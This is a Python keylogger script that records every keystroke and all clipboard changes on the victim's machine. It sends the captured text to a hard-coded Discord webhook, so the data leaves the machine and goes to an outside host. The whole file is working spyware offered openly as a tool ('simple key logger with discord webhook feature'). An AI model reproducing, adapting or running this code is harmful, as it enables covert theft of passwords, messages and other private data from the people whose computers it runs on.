is_windows = False
is_linux = False

import requests as r
import pynput
import argparse

try:
    import pyperclip
    is_windows = True

except:
    import clipboard
    is_linux = True


class KeyLogger:
    def __init__(self, is_windows, is_linux):
        global data, count, webhook, data_max_len, is_win, is_lin, clipboard_data
        is_win, is_lin, data, count, data_max_len, clipboard_data = is_windows, is_linux, "", 0, 30, "-"

        ## Enter your webhook here
        webhook = "https://discord.com/api/webhooks/711698886233948210/hxK6uPXhkOh" \
                  "-G0Q6Nc5JzmNgLHlx1s36zY3dA8yUBuwkYSi7LctMdSSgY-wRqPcIIx8L"
        ## Enter your webhook above

        with pynput.keyboard.Listener(on_press=self.detectKey) as listener:
            listener.join()

    def checkClipboard(self):
        global is_win, is_lin
        if is_win:
            try:
                return str(pyperclip.paste())
            except:
                pass
        elif is_lin:
            try:
                return str(clipboard.paste())
            except:
                pass

    def detectKey(self, key):
        global data, count, webhook, data_max_len, clipboard_data
        if count == int(data_max_len):
            self.sendWebhook(webhook, str(data))
            count, data = 0, ""
        clipped = self.checkClipboard()
        if clipboard_data != clipped:
            self.sendWebhook(webhook, str("New clipboard data detected : " + str(clipped)))
            clipboard_data = clipped
        key = str(key).replace("'", "")
        key = key.replace("Key.space", " ")
        if str(key).replace("'", "") not in "Key.backspaceKey.caps_lockKey.enter=`~\"; abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+\\|[]{}/?><,.":
            print("Entered : " + str(key))
            return 0
        key = str(key).replace("Key.caps_lock", " (caps) ")
        key = str(key).replace("Key.backspace", "(backspace)")
        if key == "Key.enter":
            self.sendWebhook(webhook, str(data))
            count, data = 0, ""
            return 0
        data += key
        count += 1

    def sendWebhook(self, webhook_link, data):
        data = {"content": str(data)}
        r.post(webhook_link, json=data)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Simple key logger with discord webhook feature')
    KeyLogger(bool(is_linux), bool(is_windows))
